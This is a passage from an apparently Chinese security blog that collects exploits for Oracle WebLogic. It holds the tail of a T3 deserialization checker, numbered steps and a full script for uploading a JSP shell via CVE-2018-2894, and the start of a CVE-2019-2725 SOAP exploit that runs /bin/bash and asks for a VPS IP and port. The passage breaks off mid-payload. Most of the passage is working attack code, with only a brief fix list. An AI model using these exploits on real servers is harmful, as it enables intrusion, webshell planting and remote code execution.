time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">        while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">            res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">            time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">def checkVul(res,server_addr,index):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    p&#x3D;re.findall(VER_SIG[index], res, re.S)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">    if len(p)&gt;0:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        print &#39;%s:%d is vul %s&#39;%(server_addr[0],server_addr[1],VUL[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        print &#39;%s:%d is not vul %s&#39; % (server_addr[0],server_addr[1],VUL[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">def run(dip,dport,index):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">    sock.settimeout(15)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">    server_addr &#x3D; (dip, dport)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">    t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">    buildT3RequestObject(sock,dport)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">    rs&#x3D;sendEvilObjData(sock,PAYLOAD[index])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">    #print &#39;rs&#39;,rs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    checkVul(rs,server_addr,index)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">    dip &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">    dport &#x3D; int(sys.argv[2])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">    run(dip,dport,0)</span></pre></td></tr></table></figure><h1 id="Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>Weblogic 任意文件上传漏洞（CVE-2018-2894）</h1><h2 id="version-2"><a href="#version-2" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.2，</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12.2.1.3</span></pre></td></tr></table></figure><p> 漏洞的影响模块为web服务测试页 ，可在base_domain-&gt;高级-&gt;启用web服务测试页 来启用</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>访问 <code>ws_utc/config.do</code> ，设置 <code>Work Home Dir:</code>为 <code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code> </p><p>之后点击安全-&gt;添加-&gt;上传文件-&gt;提交。记住返回的时间戳。</p><p>shell地址： <code>ws_utc/css/config/keystore/[timestamp]_[文件名]</code></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>访问 <code>ws_utc/begin.do</code>,点击右上角导入测试用例，上传shell。查看返回包的shell地址。</p><p>检测加利用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># Build By LandGrey</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">import argparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">import traceback</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">import xml.etree.ElementTree as ET</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">def get_current_work_path(host):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    geturl &#x3D; host + &quot;&#x2F;ws_utc&#x2F;resources&#x2F;setting&#x2F;options&#x2F;general&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    ua &#x3D; &#123;&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0&#39;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    values &#x3D; []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        request &#x3D; requests.get(geturl)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        if request.status_code &#x3D;&#x3D; 404:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">            exit(&quot;[-] &#123;&#125;  don&#39;t exists CVE-2018-2894&quot;.format(host))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        elif &quot;Deploying Application&quot;.lower() in request.text.lower():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            print(&quot;[*] First Deploying Website Please wait a moment ...&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">            time.sleep(20)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">            request &#x3D; requests.get(geturl, headers&#x3D;ua)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        if &quot;&lt;&#x2F;defaultValue&gt;&quot; in request.content:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            root &#x3D; ET.fromstring(request.content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">            value &#x3D; root.find(&quot;section&quot;).find(&quot;options&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">            for e in value:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">                for sub in e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">                    if e.tag &#x3D;&#x3D; &quot;parameter&quot; and sub.tag &#x3D;&#x3D; &quot;defaultValue&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">                        values.append(sub.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    except requests.ConnectionError:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;[-] Cannot connect url: &#123;&#125;&quot;.format(geturl))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    if values:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">        return values[0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-] Cannot get current work path\n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">        exit(request.content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">def get_new_work_path(host):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    origin_work_path &#x3D; get_current_work_path(host)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">    works &#x3D; &quot;&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    if &quot;user_projects&quot; in origin_work_path:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">        if &quot;\\&quot; in origin_work_path:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">            works &#x3D; works.replace(&quot;&#x2F;&quot;, &quot;\\&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">            current_work_home &#x3D; origin_work_path[:origin_work_path.find(&quot;user_projects&quot;)] + &quot;user_projects\\domains&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">            dir_len &#x3D; len(current_work_home.split(&quot;\\&quot;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">            domain_name &#x3D; origin_work_path.split(&quot;\\&quot;)[dir_len]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">            current_work_home +&#x3D; &quot;\\&quot; + domain_name + works</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">            current_work_home &#x3D; origin_work_path[:origin_work_path.find(&quot;user_projects&quot;)] + &quot;user_projects&#x2F;domains&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">            dir_len &#x3D; len(current_work_home.split(&quot;&#x2F;&quot;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">            domain_name &#x3D; origin_work_path.split(&quot;&#x2F;&quot;)[dir_len]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">            current_work_home +&#x3D; &quot;&#x2F;&quot; + domain_name + works</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">        current_work_home &#x3D; origin_work_path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[*] cannot handle current work home dir: &#123;&#125;&quot;.format(origin_work_path))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">    return current_work_home</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">def set_new_upload_path(host, path):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        &quot;setting_id&quot;: &quot;general&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">        &quot;BasicConfigOptions.workDir&quot;: path,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line">        &quot;BasicConfigOptions.proxyHost&quot;: &quot;&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">        &quot;BasicConfigOptions.proxyPort&quot;: &quot;80&quot;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">    request &#x3D; requests.post(host + &quot;&#x2F;ws_utc&#x2F;resources&#x2F;setting&#x2F;options&quot;, data&#x3D;data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">    if &quot;successfully&quot; in request.content:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-] Change New Upload Path failed&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        exit(request.content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">def upload_webshell(host, uri):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">    set_new_upload_path(host, get_new_work_path(host))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">    files &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">        &quot;ks_edit_mode&quot;: &quot;false&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">        &quot;ks_password_front&quot;: password,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">        &quot;ks_password_changed&quot;: &quot;true&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">        &quot;ks_filename&quot;: (&quot;360sglab.jsp&quot;, upload_content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">    request &#x3D; requests.post(host + uri, files&#x3D;files)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">    response &#x3D; request.text</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line">    match &#x3D; re.findall(&quot;&lt;id&gt;(.*?)&lt;&#x2F;id&gt;&quot;, response)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    if match:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        tid &#x3D; match[-1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line">        shell_path &#x3D; host + &quot;&#x2F;ws_utc&#x2F;css&#x2F;config&#x2F;keystore&#x2F;&quot; + str(tid) + &quot;_360sglab.jsp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">        if upload_content in requests.get(shell_path, headers&#x3D;headers).content:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">            print(&quot;[+] &#123;&#125; exists CVE-2018-2894&quot;.format(host))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">            print(&quot;[+] Check URL: &#123;&#125; &quot;.format(shell_path))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            print(&quot;[-] &#123;&#125;  don&#39;t exists CVE-2018-2894&quot;.format(host))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-] &#123;&#125;  don&#39;t exists CVE-2018-2894&quot;.format(host))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">    start &#x3D; time.time()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line">    password &#x3D; &quot;360sglab&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; &quot;&#x2F;ws_utc&#x2F;resources&#x2F;setting&#x2F;keystore&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line">    parser &#x3D; argparse.ArgumentParser()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-t&quot;, dest&#x3D;&#39;target&#39;, default&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:7001&quot;, type&#x3D;str,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;target, such as: http:&#x2F;&#x2F;example.com:7001&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line">    upload_content &#x3D; &quot;360sglab test&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">    headers &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">        &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;, &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line">        sys.argv.append(&#39;-h&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line">    args &#x3D; parser.parse_args()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">    target &#x3D; args.target</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">    target &#x3D; target.rstrip(&#39;&#x2F;&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">    if &quot;:&#x2F;&#x2F;&quot; not in target:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">        target &#x3D; &quot;http:&#x2F;&#x2F;&quot; + target</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">        upload_webshell(target, url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">    except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line">        print(&quot;[-] Error: \n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">        traceback.print_exc()</span></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>1.设置Config.do、begin.do页面登录授权后访问；</p><p>2.IPS等防御产品可以加入相应的特征；</p><p>3.升级到官方最新版本。</p><h1 id="Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）"><a href="#Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）" class="headerlink" title="Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）"></a>Weblogic反序列化远程代码执行漏洞（CVE-2019-2725）</h1><h2 id="version-3"><a href="#version-3" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 10.*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server 12.1.3</span></pre></td></tr></table></figure><h2 id="检测路径"><a href="#检测路径" class="headerlink" title="检测路径"></a>检测路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;_async&#x2F;AsyncResponseService</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;_async&#x2F;AsyncResponseServiceHttps</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;_async&#x2F;AsyncResponseServiceJms</span></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  if not (len(sys.argv)&#x3D;&#x3D;4):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">      print &quot;使用方法：VPS监听端口 weblogic.py 目标网址 VPSip 端口&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">      try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">          url&#x3D; &quot;%s&#x2F;_async&#x2F;AsyncResponseService&quot;  % (sys.argv[1])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">          raw&#x3D;&#39;&#39;&#39;&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot; xmlns:wsa&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;08&#x2F;addressing&quot; xmlns:asy&#x3D;&quot;http:&#x2F;&#x2F;www.bea.com&#x2F;async&#x2F;AsyncResponseService&quot;&gt;   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">          &lt;soapenv:Header&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">          &lt;wsa:Action&gt;xx&lt;&#x2F;wsa:Action&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">          &lt;wsa:RelatesTo&gt;xxxxxxx&lt;&#x2F;wsa:RelatesTo&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">          &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">          &lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">          &lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">          &lt;void index&#x3D;&quot;0&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">          &lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span 